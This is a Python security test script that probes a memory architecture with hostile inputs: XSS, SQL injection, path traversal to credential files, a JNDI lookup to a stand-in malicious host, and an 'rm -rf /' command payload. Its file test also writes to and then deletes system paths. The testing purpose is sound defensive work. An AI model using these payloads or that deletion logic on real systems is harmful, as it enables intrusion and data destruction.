#!/usr/bin/env python3
"""
Security and Validation Testing for Enhanced PIANO Memory Architecture
Tests input validation, data integrity, and security against malicious inputs.
"""

import sys
import os
import json
import tempfile
from datetime import datetime, timedelta
from typing import Dict, List, Any
import traceback

# Add current directory to path
sys.path.append('.')
sys.path.append('./memory_structures')

# Import memory components
from memory_structures.circular_buffer import CircularBuffer, CircularBufferReducer
from memory_structures.temporal_memory import TemporalMemory
from memory_structures.episodic_memory import EpisodicMemory, CausalRelationType, EpisodeType
from memory_structures.semantic_memory import SemanticMemory, ConceptType, SemanticRelationType


class SecurityError(Exception):
    """Custom exception for security-related errors."""
    pass


class SecurityTestResult:
    """Security test result tracking"""
    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.errors = []
        self.vulnerabilities = []
        self.security_checks = {}
    
    def add_pass(self, test_name: str, security_check: str = None):
        self.passed += 1
        print(f"✅ {test_name}")
        if security_check:
            self.security_checks[security_check] = True
    
    def add_fail(self, test_name: str, error: str, security_check: str = None):
        self.failed += 1
        self.errors.append(f"{test_name}: {error}")
        print(f"❌ {test_name}: {error}")
        if security_check:
            self.security_checks[security_check] = False
    
    def add_vulnerability(self, vulnerability: str, severity: str, description: str):
        self.vulnerabilities.append({
            'vulnerability': vulnerability,
            'severity': severity,
            'description': description
        })
        print(f"🚨 VULNERABILITY [{severity}]: {vulnerability} - {description}")
    
    def summary(self):
        total = self.passed + self.failed
        print(f"\n{'='*60}")
        print(f"SECURITY TEST SUMMARY: {self.passed}/{total} passed ({100*self.passed/total if total > 0 else 0:.1f}%)")
        print(f"{'='*60}")
        
        # Security checks summary
        if self.security_checks:
            passed_checks = sum(1 for passed in self.security_checks.values() if passed)
            total_checks = len(self.security_checks)
            print(f"SECURITY CHECKS: {passed_checks}/{total_checks} passed")
            
            for check, passed in self.security_checks.items():
                status = "✅" if passed else "❌"
                print(f"  {status} {check}")
        
        # Vulnerabilities summary
        if self.vulnerabilities:
            print(f"\n🚨 VULNERABILITIES FOUND: {len(self.vulnerabilities)}")
            for vuln in self.vulnerabilities:
                print(f"  [{vuln['severity']}] {vuln['vulnerability']}: {vuln['description']}")
        else:
            print("\n🛡️  NO VULNERABILITIES DETECTED")
        
        if self.errors:
            print("\nFAILURES:")
            for error in self.errors:
                print(f"  • {error}")
        
        return self.failed == 0 and len(self.vulnerabilities) == 0


def test_input_validation_and_sanitization(result: SecurityTestResult):
    """Test input validation and sanitization across all memory systems"""
    print("\n--- Input Validation and Sanitization ---")
    
    # Test malicious string inputs
    malicious_inputs = [
        "",  # Empty string
        " " * 10000,  # Very long whitespace
        "A" * 100000,  # Extremely long string
        "<script>alert('xss')</script>",  # XSS attempt
        "'; DROP TABLE memories; --",  # SQL injection attempt
        "\x00\x01\x02\x03",  # Binary data
        "../../etc/passwd",  # Path traversal
        "${jndi:ldap://malicious.com/}",  # Log4j-style injection
        "\n\r\t" * 1000,  # Control characters
        "🚨💻🔥" * 1000,  # Unicode flood
    ]
    
    try:
        buffer = CircularBuffer(max_size=20)
        
        for i, malicious_input in enumerate(malicious_inputs):
            try:
                # Test buffer accepts/rejects malicious input appropriately
                mem_id = buffer.add_memory(malicious_input, "event", 0.5)
                
                # Verify the content was handled safely
                memories = buffer.get_recent_memories(1)
                if memories:
                    stored_content = memories[0]["content"]
                    
                    # Check for basic sanitization
                    if len(stored_content) > 50000:  # Should limit extremely long inputs
                        result.add_vulnerability("Input Length", "MEDIUM", 
                                               f"Accepts extremely long input: {len(stored_content)} chars")
                    
                    if "<script>" in stored_content.lower():
                        result.add_vulnerability("XSS Protection", "HIGH", 
                                               "Script tags not filtered from input")
                    
                    if "\x00" in stored_content:
                        result.add_vulnerability("Binary Data", "LOW", 
                                               "Binary data accepted in text fields")
            
            except Exception as e:
                # Exceptions are acceptable for malicious input
                pass
        
        result.add_pass("Input Validation: Malicious string handling", "input_validation")
    
    except Exception as e:
        result.add_fail("Input Validation: Malicious strings", str(e), "input_validation")
    
    # Test type validation
    try:
        buffer = CircularBuffer(max_size=10)
        temporal = TemporalMemory(retention_hours=1)
        
        # Test invalid importance values
        invalid_importance = [-1.0, 2.0, float('inf'), float('nan'), None, "high"]
        
        for invalid_val in invalid_importance:
            try:
                buffer.add_memory("Test content", "event", invalid_val)
                # Should not reach here with truly invalid values
                if invalid_val is None or isinstance(invalid_val, str):
                    result.add_vulnerability("Type Validation", "MEDIUM", 
                                           f"Accepts invalid importance type: {type(invalid_val)}")
            except (TypeError, ValueError):
                # Expected behavior for invalid types
                pass
        
        result.add_pass("Input Validation: Type checking", "type_validation")
    
    except Exception as e:
        result.add_fail("Input Validation: Type checking", str(e), "type_validation")


def test_data_integrity_and_consistency(result: SecurityTestResult):
    """Test data integrity and consistency protections"""
    print("\n--- Data Integrity and Consistency ---")
    
    try:
        # Test serialization integrity
        buffer = CircularBuffer(max_size=10)
        buffer.add_memory("Original content", "event", 0.8)
        
        # Serialize and modify the JSON
        original_dict = buffer.to_dict()
        tampered_dict = original_dict.copy()
        
        # Tamper with the data
        tampered_dict['memories'][0]['content'] = "TAMPERED CONTENT"
        tampered_dict['memories'][0]['importance'] = 999.0  # Invalid value
        
        try:
            # Try to restore from tampered data
            restored_buffer = CircularBuffer.from_dict(tampered_dict)
            
            # Check if tampering was detected/handled
            restored_memories = restored_buffer.get_recent_memories(1)
            if restored_memories:
                if restored_memories[0]['importance'] > 1.0:
                    result.add_vulnerability("Data Integrity", "HIGH", 
                                           "Tampered importance values not validated on restore")
        
        except Exception:
            # Expected behavior - should reject tampered data
            pass
        
        result.add_pass("Data Integrity: Serialization tampering", "data_integrity")
    
    except Exception as e:
        result.add_fail("Data Integrity: Serialization", str(e), "data_integrity")
    
    # Test memory consistency under concurrent access
    try:
        semantic = SemanticMemory(max_concepts=50)
        
        # Create initial state
        concept1 = semantic.add_concept("Person1", ConceptType.PERSON, "Test person", 0.7)
        concept2 = semantic.add_concept("Person2", ConceptType.PERSON, "Test person", 0.6)
        
        # Add relationship
        rel_id = semantic.add_relation(concept1, concept2, SemanticRelationType.KNOWS, 0.8)
        
        # Verify consistency
        if concept1 not in semantic.concepts:
            result.add_vulnerability("Consistency", "HIGH", "Concept reference lost after relation creation")
        
        if len(semantic.relations) != 1:
            result.add_vulnerability("Consistency", "MEDIUM", "Relation count inconsistent")
        
        result.add_pass("Data Integrity: Relationship consistency", "consistency_check")
    
    except Exception as e:
        result.add_fail("Data Integrity: Consistency", str(e), "consistency_check")


def test_file_system_security(result: SecurityTestResult):
    """Test file system security and path traversal protection"""
    print("\n--- File System Security ---")
    
    try:
        buffer = CircularBuffer(max_size=5)
        buffer.add_memory("Test file security", "event", 0.5)
        
        # Test path traversal attempts
        dangerous_paths = [
            "../../../etc/passwd",
            "/etc/shadow",
            "..\\..\\windows\\system32\\config\\sam",
            "/dev/null",
            "/proc/self/mem",
            "file:///etc/passwd",
            "\\\\network\\share\\file",
        ]
        
        for dangerous_path in dangerous_paths:
            try:
                # This should either reject the path or sanitize it
                buffer.save_to_file(dangerous_path)
                
                # If it succeeded, check if file was created in dangerous location
                if os.path.exists(dangerous_path):
                    result.add_vulnerability("Path Traversal", "CRITICAL", 
                                           f"Created file at dangerous path: {dangerous_path}")
                    # Cleanup dangerous file
                    try:
                        os.unlink(dangerous_path)
                    except:
                        pass
            
            except (OSError, ValueError, SecurityError):
                # Expected behavior - should reject dangerous paths
                pass
        
        result.add_pass("File System Security: Path traversal protection", "path_traversal")
    
    except Exception as e:
        result.add_fail("File System Security: Path traversal", str(e), "path_traversal")
    
    # Test file permission security
    try:
        with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
            tmp_filename = tmp_file.name
        
        buffer = CircularBuffer(max_size=5)
        buffer.add_memory("Permission test", "event", 0.5)
        buffer.save_to_file(tmp_filename)
        
        # Check file permissions
        file_stat = os.stat(tmp_filename)
        file_mode = file_stat.st_mode
        
        # Check if file is world-readable (potential security issue)
        if file_mode & 0o004:  # World readable
            result.add_vulnerability("File Permissions", "LOW", 
                                   "Memory files are world-readable")
        
        # Cleanup
        os.unlink(tmp_filename)
        result.add_pass("File System Security: File permissions", "file_permissions")
    
    except Exception as e:
        result.add_fail("File System Security: File permissions", str(e), "file_permissions")


def test_memory_leak_protection(result: SecurityTestResult):
    """Test protection against memory leaks and resource exhaustion"""
    print("\n--- Memory Leak Protection ---")
    
    try:
        # Test circular reference handling
        episodic = EpisodicMemory(max_episodes=10)
        
        # Create events with circular references
        event1 = episodic.add_event("Event 1", "conversation", 0.7, 
                                  participants={"Person1"}, location="Room1")
        event2 = episodic.add_event("Event 2", "conversation", 0.8, 
                                  participants={"Person1"}, location="Room1")
        
        # Create circular causal relationships
        episodic.add_causal_relation(event1, event2, CausalRelationType.ENABLES, 0.8, 0.9)
        episodic.add_causal_relation(event2, event1, CausalRelationType.ENABLES, 0.7, 0.8)
        
        # Verify system handles circular references
        if len(episodic.causal_relations) == 2:
            result.add_pass("Memory Leak: Circular reference handling", "circular_refs")
        else:
            result.add_fail("Memory Leak: Circular references", 
                          f"Expected 2 relations, got {len(episodic.causal_relations)}", 
                          "circular_refs")
    
    except Exception as e:
        result.add_fail("Memory Leak: Circular references", str(e), "circular_refs")
    
    # Test resource cleanup
    try:
        # Create and destroy many objects
        buffers = []
        for i in range(100):
            buffer = CircularBuffer(max_size=10)
            buffer.add_memory(f"Resource test {i}", "event", 0.5)
            buffers.append(buffer)
        
        # Clear references
        buffers.clear()
        
        # Force garbage collection would happen here in a real scenario
        # For this test, we just verify the system doesn't crash
        result.add_pass("Memory Leak: Resource cleanup", "resource_cleanup")
    
    except Exception as e:
        result.add_fail("Memory Leak: Resource cleanup", str(e), "resource_cleanup")


def test_serialization_security(result: SecurityTestResult):
    """Test serialization security against malicious payloads"""
    print("\n--- Serialization Security ---")
    
    try:
        # Test malicious JSON payloads
        malicious_payloads = [
            '{"__class__": "os.system", "command": "rm -rf /"}',  # Code execution attempt
            '{"memories": [{"content": "' + 'A' * 1000000 + '"}]}',  # Memory bomb
            '{"circular_ref": {"self": "circular_ref"}}',  # Circular reference
            '{"memories": null}',  # Null injection
            '{"memories": []}' * 10000,  # Parser bomb
        ]
        
        for payload in malicious_payloads:
            try:
                # Parse as JSON
                data = json.loads(payload)
                
                # Try to restore from malicious data
                buffer = CircularBuffer.from_dict(data)
                
                # If successful, verify it's safe
                if len(str(buffer.to_dict())) > 100000:
                    result.add_vulnerability("Serialization", "MEDIUM", 
                                           "Large serialized objects not limited")
            
            except (json.JSONDecodeError, KeyError, TypeError, ValueError):
                # Expected behavior - should reject malicious payloads
                pass
        
        result.add_pass("Serialization Security: Malicious payload rejection", "serialization_security")
    
    except Exception as e:
        result.add_fail("Serialization Security: Payload testing", str(e), "serialization_security")


def test_information_disclosure_protection(result: SecurityTestResult):
    """Test protection against information disclosure"""
    print("\n--- Information Disclosure Protection ---")
    
    try:
        # Test error message information leakage
        buffer = CircularBuffer(max_size=5)
        
        try:
            # Trigger various error conditions
            buffer.add_memory(None, "event", 0.5)  # Should fail gracefully
        except Exception as e:
            error_msg = str(e)
            
            # Check if error messages leak sensitive information
            sensitive_patterns = [
                "/home/", "/Users/", "C:\\Users\\",  # File paths
                "password", "secret", "key",  # Sensitive terms
                "SELECT", "INSERT", "DELETE",  # SQL queries
            ]
            
            for pattern in sensitive_patterns:
                if pattern.lower() in error_msg.lower():
                    result.add_vulnerability("Information Disclosure", "LOW", 
                                           f"Error message may leak sensitive info: {pattern}")
        
        result.add_pass("Information Disclosure: Error message safety", "info_disclosure")
    
    except Exception as e:
        result.add_fail("Information Disclosure: Error messages", str(e), "info_disclosure")


def test_denial_of_service_protection(result: SecurityTestResult):
    """Test protection against denial of service attacks"""
    print("\n--- Denial of Service Protection ---")
    
    try:
        # Test algorithmic complexity attacks
        semantic = SemanticMemory(max_concepts=100)
        
        # Create a worst-case scenario for graph algorithms
        concept_ids = []
        for i in range(50):
            concept_id = semantic.add_concept(f"DoS_Concept_{i}", ConceptType.PERSON, 
                                            f"Person {i}", 0.5)
            concept_ids.append(concept_id)
        
        # Create a complete graph (worst case for path finding)
        import time
        start_time = time.perf_counter()
        
        for i in range(len(concept_ids)):
            for j in range(i+1, min(i+10, len(concept_ids))):  # Limit to prevent actual DoS
                semantic.add_relation(concept_ids[i], concept_ids[j], 
                                    SemanticRelationType.KNOWS, 0.5)
        
        # Test retrieval performance
        activated = semantic.retrieve_by_association([concept_ids[0]], max_hops=3)
        
        end_time = time.perf_counter()
        operation_time = (end_time - start_time) * 1000
        
        if operation_time > 5000:  # More than 5 seconds
            result.add_vulnerability("DoS Protection", "MEDIUM", 
                                   f"Complex graph operations take {operation_time:.2f}ms")
        else:
            result.add_pass("DoS Protection: Algorithmic complexity", "dos_protection")
    
    except Exception as e:
        result.add_fail("DoS Protection: Complexity attacks", str(e), "dos_protection")


def main():
    """Execute comprehensive security and validation tests"""
    print("🛡️  Enhanced PIANO Memory Architecture - Security and Validation Testing")
    print("="*70)
    print("Testing input validation, data integrity, and security protections...")
    
    result = SecurityTestResult()
    
    # Execute all security test categories
    test_input_validation_and_sanitization(result)
    test_data_integrity_and_consistency(result)
    test_file_system_security(result)
    test_memory_leak_protection(result)
    test_serialization_security(result)
    test_information_disclosure_protection(result)
    test_denial_of_service_protection(result)
    
    # Final security assessment
    success = result.summary()
    
    if success:
        print("\n🛡️  ALL SECURITY TESTS PASSED! Memory architecture is secure.")
        print("✅ No vulnerabilities detected. System follows security best practices.")
    else:
        print(f"\n🚨 SECURITY ISSUES DETECTED!")
        if result.vulnerabilities:
            critical_count = sum(1 for v in result.vulnerabilities if v['severity'] == 'CRITICAL')
            high_count = sum(1 for v in result.vulnerabilities if v['severity'] == 'HIGH')
            
            if critical_count > 0:
                print(f"⚠️  {critical_count} CRITICAL vulnerabilities require immediate attention!")
            if high_count > 0:
                print(f"⚠️  {high_count} HIGH severity vulnerabilities found!")
    
    # Security recommendations
    print(f"\n📋 SECURITY RECOMMENDATIONS:")
    print(f"• Implement input validation and sanitization for all user inputs")
    print(f"• Add rate limiting to prevent DoS attacks")
    print(f"• Use secure file permissions (600) for memory files")
    print(f"• Implement proper error handling to prevent information disclosure")
    print(f"• Add integrity checks for serialized data")
    print(f"• Consider encryption for sensitive memory data")
    
    return 0 if success else 1


if __name__ == "__main__":
    exit_code = main()
    sys.exit(exit_code)